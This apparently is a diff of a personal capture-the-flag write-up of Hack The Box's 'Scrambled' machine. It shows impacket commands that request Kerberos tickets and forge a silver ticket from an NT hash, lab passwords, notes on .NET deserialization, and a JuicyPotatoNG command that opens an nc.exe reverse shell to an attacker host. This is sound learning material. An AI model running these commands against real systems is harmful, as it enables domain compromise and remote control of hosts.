@@ -1,7 +1,7 @@
 # Scrambled Helped Through
 
 Name: Scrambled
-Date:  5/12/2022
+Date:  12/12/2022
 Difficulty:  Medium
 Goals:  
 - Have fun
@@ -12,7 +12,12 @@ Goals:
 - More AD to add to Azure AD studies 
 Learnt:
 - NTLM is almost always never disabled in AD
+- RTFM and pivoting to other tools  is better the melting your keyboard to your forehead
+RID bruteforcing is NTLM authenication only! 
+- WTF is C# deserialization
+- Expanding my impacket usage and knowledge
 
+[Hack-a-long with Alh4zr3d Cthulhu Cthursday: Hackthebox's Scrambled with Ippsec!](https://www.youtube.com/watch?v=-ulAAiUzQu0)
 
 ## Recon
 
@@ -50,6 +55,8 @@ sudo apt install krb5-user
 ```
 
 ![](ticketsaved.png)
+
+
 
 After taking a detour to try to make crackmapexec work with kerberos and updating my pass the ticket notes, given this is a helped-through check 0xdf learning that equivalence table would be really helpful. The equivilent required in this scenario where cme won't work need to enumerate share, but smbclient will also fail turn to impacket. 
 
@@ -228,9 +235,76 @@ We should always run `whoami /all or priv`
 
 [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) and the [Blog](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
 
-3:07 - https://www.youtube.com/watch?v=-ulAAiUzQu0
+```bash
+git clone https://github.com/SecureAuthCorp/impacket.git 
+python3 getTGT.py -dc-ip 10.129.2.93 scrm.local/sqlsvc:Pegasus60
+export KRB5CCNAME=~$(pwd)/sqlsvc.ccache
+
+python3 ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip 10.129.2.93 -spn MSSQLSvc/dc1.scrm.local Administrator
+
+export KRB5CCNAME=Administrator.ccache
+python3 mssqlclient.py -no-pass -k scrm.local/Administrator@dc1.scrm.local
+```
 
 
-## PrivEsc
+```powershell
+./JuicyPotatoNG.exe -t * -p 'C:\Windows\System32\cmd.exe' -a '/c C:\Programdata\nvm\jpng\nc.exe 10.10.14.109 8889 -e cmd.exe'
+```
 
-## Beyond Root
+
+## PrivEsc 
+
+A new Potato exploit done!
+![](yeeharrrr.png)
+
+## Beyond Root and *Alternate* - The Intended Path
+
+For this I am going to read up on the  new potato exploit, explain the website structuring and follow along with Al for the intended path.  
+
+####  The Intended Path
+
+The intend path a starts with the credentials that were found in the mssql database:
+
+`miscsvc :  ScrambledEggs9900`
+
+![](getmiscsvc.png)
+
+With this we can use smbclient.py to enumerate the shares
+![](sharesformiscsvc.png)
+
+We have access to the IT share
+![](ITshare.png)
+
+Rofling at the fact [*"we are animals for not needed to escape spaces"*](https://youtu.be/-ulAAiUzQu0?t=12109) 
+![](degeneration.png)
+
+ILspy was used:
+![](ilspy.png)
+
+- What does the application do?
+Client that  can
+- upload orders
+- list orders
+- logon and quit 
+
+I went to check the strings see if there are credentials hard coded - nope. 
+
+A Common Object-Oriented Language exploitation is attacking the deserialization - [it is out moded form of coding](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide). 
+![](serialdeserial.png)
+I have never really codede in OO languages so this for me is new. We need to find a object that can be deserialized to exploit this. 
+
+This is server side code where write. I then got dnSpy for the search functionality.
+![](wecanwritetothelog.png)
+
+[GitHub - dnSpy/dnSpy: .NET debugger and assembly editor](https://github.com/dnSpy/dnSpy)
+
+When make New Order it creates a serialized order and sending with UPLOAD_ORDER command, so we could adjust send a arbituary object with netcat with whysoserial.
+
+
+#### Website
+
+[Build a Static Website on IIS](https://learn.microsoft.com/en-us/iis/manage/creating-websites/scenario-build-a-static-website-on-iis) had a little point around and read.
+
+#### JuicyPotatoNG TIL
+
+User requires either SeAssignPrimaryTokenPrivilege or seImpersonatePrivilege to impersonate System. These privilege are used legitmately for patching by services and software to perform task that require system level access. The exploit attempt to activate a local [COM object](https://en.wikipedia.org/wiki/Component_Object_Model) (a binary interface to for inter-process communication) using an SSPI hook on _[AcceptSecurityContext()](https://learn.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-acceptsecuritycontext)_ function to then force an authenication attempt that is capture by the exploit and abuse to elevate to system to perform a specified command by user.
